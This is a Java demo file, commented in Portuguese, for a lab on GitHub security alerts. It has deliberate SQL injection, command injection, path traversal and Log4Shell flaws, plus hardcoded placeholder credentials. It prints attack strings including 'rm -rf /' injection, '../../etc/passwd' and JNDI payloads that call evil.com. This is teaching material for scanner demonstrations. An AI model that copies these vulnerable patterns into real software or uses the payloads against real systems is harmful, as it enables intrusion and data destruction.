package com.securitydemo;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * ╔══════════════════════════════════════════════════════════════════╗
 * ║          PROJETO EDUCACIONAL - GITHUB SECURITY ALERTS LAB       ║
 * ║  Este arquivo contém vulnerabilidades INTENCIONAIS para fins     ║
 * ║  de demonstração dos alertas do GitHub Security.                 ║
 * ║  ⚠️  NÃO USE EM PRODUÇÃO  ⚠️                                    ║
 * ╚══════════════════════════════════════════════════════════════════╝
 *
 * Vulnerabilidades presentes:
 * 1. [SECRET SCANNING]  Credenciais hardcoded (AWS, GitHub Token, DB)
 * 2. [CODE SCANNING]    SQL Injection via entrada do usuário
 * 3. [CODE SCANNING]    Command Injection via Runtime.exec()
 * 4. [CODE SCANNING]    Path Traversal
 * 5. [CODE SCANNING]    Log4Shell via log4j 2.14.1 (CVE-2021-44228)
 * 6. [DEPENDABOT]       Dependências com CVEs conhecidos no pom.xml
 */
public class App {

    // =========================================================
    // ⚠️ ALERTA: SECRET SCANNING
    // GitHub irá detectar estes padrões de credenciais
    // =========================================================

    // Dispara: "Amazon AWS Access Key ID" secret alert
    private static final String AWS_ACCESS_KEY_ID     = "AKIAIOSFODNN7EXAMPLE";
    private static final String AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY";

    // Dispara: "GitHub Personal Access Token" secret alert
    private static final String GITHUB_TOKEN = "ghp_16C7e42F292c6912E7710c838347Ae178B4a";

    // Dispara: "Generic API Key" / "Generic Secret" alert
    private static final String API_KEY      = "sk-proj-abcdef1234567890abcdef1234567890abcdef12";
    private static final String DB_PASSWORD  = "SuperSecretPassword123!";
    private static final String JWT_SECRET   = "my-super-secret-jwt-signing-key-do-not-share";

    private static final Logger logger = LogManager.getLogger(App.class);

    public static void main(String[] args) {
        System.out.println("=== Java Security Demo - GitHub Alerts Lab ===");
        System.out.println("Iniciando demonstração de vulnerabilidades...\n");

        App app = new App();

        // Simulando input de usuário malicioso
        String userInput = args.length > 0 ? args[0] : "demo_user";

        app.runDemonstrations(userInput);
    }

    public void runDemonstrations(String userInput) {
        System.out.println("[1] Testando SQL Injection...");
        demonstrateSqlInjection(userInput);

        System.out.println("[2] Testando Command Injection...");
        demonstrateCommandInjection(userInput);

        System.out.println("[3] Testando Path Traversal...");
        demonstratePathTraversal(userInput);

        System.out.println("[4] Testando Log4Shell...");
        demonstrateLog4Shell(userInput);

        System.out.println("\nDemonstração concluída. Verifique os alertas no GitHub Security.");
    }

    // =========================================================
    // ⚠️ ALERTA: CODE SCANNING - SQL Injection
    // CWE-89: Improper Neutralization of Special Elements
    // CodeQL query: java/sql-injection
    // =========================================================
    public void demonstrateSqlInjection(String username) {
        // VULNERÁVEL: concatenação direta de input do usuário na query SQL
        String query = "SELECT * FROM users WHERE username = '" + username + "'";

        System.out.println("  Query gerada (VULNERÁVEL): " + query);
        System.out.println("  ✗ Vulnerável a: ' OR '1'='1' --");
        System.out.println("  ✓ Correção: usar PreparedStatement com parâmetros\n");

        // Exemplo de ataque: username = "' OR '1'='1' --"
        // Query resultante: SELECT * FROM users WHERE username = '' OR '1'='1' --'
    }

    // =========================================================
    // ⚠️ ALERTA: CODE SCANNING - Command Injection
    // CWE-78: Improper Neutralization of Special Elements in OS Command
    // CodeQL query: java/command-line-injection
    // =========================================================
    public void demonstrateCommandInjection(String filename) {
        try {
            // VULNERÁVEL: input do usuário diretamente no comando do SO
            String command = "ls -la " + filename;
            Runtime runtime = Runtime.getRuntime();
            Process process = runtime.exec(command); // ← CodeQL detecta aqui

            System.out.println("  Comando executado (VULNERÁVEL): " + command);
            System.out.println("  ✗ Vulnerável a: 'file.txt; rm -rf /'");
            System.out.println("  ✓ Correção: usar ProcessBuilder com lista de argumentos\n");

        } catch (Exception e) {
            System.out.println("  Erro simulado (esperado): " + e.getMessage() + "\n");
        }
    }

    // =========================================================
    // ⚠️ ALERTA: CODE SCANNING - Path Traversal
    // CWE-22: Improper Limitation of a Pathname to a Restricted Directory
    // CodeQL query: java/path-injection
    // =========================================================
    public void demonstratePathTraversal(String filename) {
        try {
            // VULNERÁVEL: input do usuário usado para construir caminho de arquivo
            java.io.File file = new java.io.File("/app/uploads/" + filename); // ← CodeQL detecta aqui
            boolean exists = file.exists();

            System.out.println("  Caminho gerado (VULNERÁVEL): " + file.getPath());
            System.out.println("  ✗ Vulnerável a: '../../etc/passwd'");
            System.out.println("  ✓ Correção: validar e canonicalizar o caminho\n");

        } catch (Exception e) {
            System.out.println("  Erro simulado: " + e.getMessage() + "\n");
        }
    }

    // =========================================================
    // ⚠️ ALERTA: CODE SCANNING + DEPENDABOT - Log4Shell
    // CVE-2021-44228: Apache Log4j2 JNDI Injection (CVSS 10.0)
    // CodeQL + Dependabot irão alertar sobre isto
    // =========================================================
    public void demonstrateLog4Shell(String userInput) {
        // VULNERÁVEL: logar input do usuário sem sanitização com Log4j 2.14.1
        // Um atacante pode enviar: ${jndi:ldap://malicious-server.com/exploit}
        logger.info("Usuário conectou: {}", userInput); // ← Log4Shell via taint analysis

        System.out.println("  Log4j versão: 2.14.1 (VULNERÁVEL ao Log4Shell)");
        System.out.println("  ✗ Payload: ${jndi:ldap://evil.com/exploit}");
        System.out.println("  ✓ Correção: atualizar para log4j 2.17.1+\n");
    }
}
